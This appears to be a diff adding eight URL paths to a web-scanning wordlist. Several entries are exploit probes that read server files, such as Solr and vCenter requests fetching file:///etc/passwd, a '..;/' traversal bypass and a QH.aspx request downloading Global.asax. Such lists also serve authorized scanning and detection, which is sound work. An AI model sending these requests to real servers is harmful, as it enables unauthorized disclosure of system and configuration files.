@@ -1,0 +1,8 @@
+/solr/
+/solr/debug/dump?stream.url=file:///etc/passwd&param=ContentStream
+/solr//..;/
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd
+/admin/
+/solr/admin/
+/solr/supplierSearch_V2/dataimport
+/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fGlobal.asax
